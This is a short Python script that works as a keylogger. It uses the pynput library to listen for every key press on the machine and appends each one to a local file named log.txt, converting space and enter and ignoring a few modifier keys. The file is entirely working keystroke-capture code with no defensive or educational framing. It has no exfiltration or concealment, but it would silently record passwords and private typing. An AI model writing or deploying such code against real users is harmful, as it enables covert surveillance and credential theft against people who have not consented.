from pynput.keyboard import Listener


# Define a function to handle key press events
def write_to_log(key):
    # Convert the key press event to a string
    key_data = str(key)

    # Remove the quotes around character keys (like 'a' -> a)
    key_data = key_data.replace("'", "")

    # Check for special keys and adjust key_data accordingly
    if key_data == "Key.space":
        key_data = " "  # Replace space key with a space character
    elif key_data == "Key.enter":
        key_data = "\n"  # Replace enter key with a newline character
    elif key_data in ["Key.shift_r", "Key.ctrl_l"]:
        key_data = ""  # Ignore right shift and left control keys

    # Append the key data to a log file
    with open("log.txt", "a") as file:
        file.write(key_data)


# Set up the keyboard listener to capture keystrokes
with Listener(on_press=write_to_log) as listener:
    listener.join()  # Keep the listener running until the program is stopped
